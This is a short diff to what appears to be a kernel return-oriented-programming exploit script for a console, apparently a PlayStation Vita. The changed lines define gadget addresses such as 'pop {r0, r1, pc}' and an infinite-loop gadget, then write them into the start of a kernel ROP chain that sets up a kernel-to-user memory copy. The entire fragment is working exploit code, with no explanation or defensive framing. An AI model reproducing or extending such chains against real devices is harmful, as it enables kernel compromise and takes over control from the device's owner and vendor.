@@ -42,6 +42,7 @@ data
     symbol k_blx_r4_pop_r4_pc = 0x49aed3;
     symbol k_infloop = 0x4b2063;
     symbol k_sceKernelMemcpyKernelToUser = 0x48A1D9;
+    symbol k_pop_r0_r1_pc = 0x480000 + 0x491b; // 0x000000000000491a : pop {r0, r1, pc}
 }
 
 code : entry
@@ -79,6 +80,9 @@ code : entry
     // 0x000000000002d471 : pop {r0, r1, r2, r3, r4, pc}
 
     // start krop
+    store(k_pop_r0_r1_pc, KROP + 4 * 0);
+    store(k_infloop, KROP + 4 * 3);
+
     store(k_pop_r0_r4_pc, KROP + 4 * 0);
     store(0x812B0000, KROP + 4 * 1); // r0 = dst
     store(0x480000, KROP + 4 * 2); // r1 = src
